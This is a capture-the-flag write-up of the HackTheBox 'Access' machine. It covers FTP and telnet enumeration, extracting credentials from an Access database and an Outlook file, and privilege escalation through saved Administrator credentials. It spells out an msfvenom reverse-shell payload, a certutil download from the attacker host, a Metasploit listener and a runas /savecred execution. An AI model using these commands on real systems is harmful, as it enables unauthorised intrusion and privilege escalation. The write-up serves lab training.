### **Access - HackTheBox Lab**

#### **Date:** 2024-12-08  
#### **Target:** `10.10.10.98`  

---

## **Scope**

The goal is to enumerate the target, identify vulnerabilities, gain access, and escalate privileges.

---

## **Gaining Access**

### **Ports Enumeration**

1. **Initial Full Port Scan**  
   I ran a full TCP port scan to identify all open ports:
   ```bash
   nmap -A -p- -iL target -v
   ```
   Results revealed three open ports:  
   - **Port 21:** FTP (Microsoft ftpd)  
   - **Port 23:** Telnet  
   - **Port 80:** HTTP (Microsoft IIS httpd 7.5)

2. **Targeted Port Scan**  
   To gather detailed information, I performed an aggressive scan against the identified ports:
   ```bash
   nmap -A -p21,23,80 -iL target -v -oN target_ports.txt
   ```
   Key findings included:  
   - FTP allows **anonymous login** but restricts directory listing.
   - HTTP server runs **Microsoft IIS 7.5**, hosting a simple web page.
   - Telnet prompts for login credentials.

---

### **HTTP Enumeration**

1. **Web Server Overview**  
   The HTTP server displayed a static page with the title "MegaCorp." Server headers identified it as **Microsoft IIS 7.5** running ASP.NET.

2. **Search for Vulnerabilities**  
   Using `searchsploit`, I looked for potential exploits:
   ```bash
   searchsploit iis 7.5
   ```
   No critical vulnerabilities directly applicable to the setup were identified.

3. **Directory Brute-Forcing with `ffuf`**  
   A brute-force directory scan using `ffuf` yielded no additional paths.

4. **Nikto Scan**  
   A `nikto` scan highlighted several informational findings, including:
   - Missing `X-Frame-Options` and `X-Content-Type-Options` headers.
   - Supported HTTP methods: `OPTIONS, TRACE, GET, HEAD, POST`.

---

### **Telnet Enumeration**

1. **Login Prompt**  
   Attempting to connect:
   ```bash
   telnet 10.10.10.98 23
   ```
   This revealed a **Microsoft Telnet Service** requiring credentials.

2. **Nmap Telnet Script Scan**  
   Using Nmap scripts for Telnet:
   ```bash
   nmap -n -sV -Pn --script "*telnet* and safe" -p 23 $(cat target)
   ```
   The scan revealed additional information:
   - **Host Name:** ACCESS

---

### **FTP Enumeration**

1. **Access FTP Server**  
   Anonymous login was enabled:
   ```bash
   ftp -a 10.10.10.98
   ```
   Inside the FTP server, I discovered two files:  
   - `backup.mdb` (Microsoft Access Database)  
   - `Access Control.zip` (Password-protected ZIP file)

2. **Download Files**  
   To download the files:
   ```bash
   bin
   get backup.mdb
   get "Access Control.zip"
   ```

   ![image](https://github.com/user-attachments/assets/95c46133-1ab3-4af9-b701-65e5696af23f)

3. **Analyze Database File**  
   Using `mdb-tools`, I extracted tables from the `.mdb` file:
   ```bash
   mdb-tables backup.mdb | sed 's/ /\n/g' > tables
   ```
   The `auth_user` table contained credentials, which I exported:
   ```bash
   mdb-export backup.mdb auth_user > auth_user.csv
   ```
   
   ![image](https://github.com/user-attachments/assets/b49f3d06-3df1-4b63-900d-96555d817181)

4. **Decrypt ZIP File**  
   One password from the `auth_user` table successfully decrypted `Access Control.zip`:
   ```bash
   7z x "Access Control.zip"
   ```
   This extracted a `.pst` file (Microsoft Outlook Data File).

5. **Converted pst file to mbox**
   To convert a pst file to mbox I ran:
   ```bash
   readpst "Access Control.pst"
   ```
6. **Gain Access**
   Reading the mbox file I found the user credential.
   I used telnet to test them and I gain access on the target machine, obtaining the user flag.

---

## **Privilege Escalation**

1. **System Information**  
   Running `systeminfo`:
   ```cmd
   systeminfo
   ```
   Identified:
   - **OS:** Windows Server 2008 R2 Standard  
   - **Hotfixes:** Multiple missing patches (potential vulnerabilities).  

2. **Exploit Preparation**  
   I notice Administrative credential saved on the target machine by running:
   ```cmd
   cmdkey /list
   ```
   
   ![image](https://github.com/user-attachments/assets/952e395b-1361-4ff0-a317-59b06b60500a)

   I prepared a reverse shell payload using `msfvenom`:
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.9 LPORT=2323 -f exe > p.exe
   ```

3. **File Transfer**  
   Using `certutil`, I transferred the payload to the victim machine:
   ```cmd
   cd %TEMP%
   certutil -urlcache -f "http://10.10.16.9:9878/p.exe" p.exe
   ```

4. **Open Listener**  
   On my local machine, I started a listener with `msfconsole`:
   ```bash
   msfconsole
   use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST 10.10.16.9
   set LPORT 2323
   run
   ```
5. **Execute Payload**  
   I used stored credentials to run the payload with administrative privileges:
   ```cmd
   runas /savecred /user:ACCESS\Administrator p.exe
   ```
   I got the shell and the root flag.

---

## **Resources**

- [Kali - MDB Tools](https://www.kali.org/tools/mdbtools/)  
- [Kali - libpst](https://www.kali.org/tools/libpst/)  
- [Windows Privilege Escalation Notes](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/StoredCredentialsRunas.md)

---
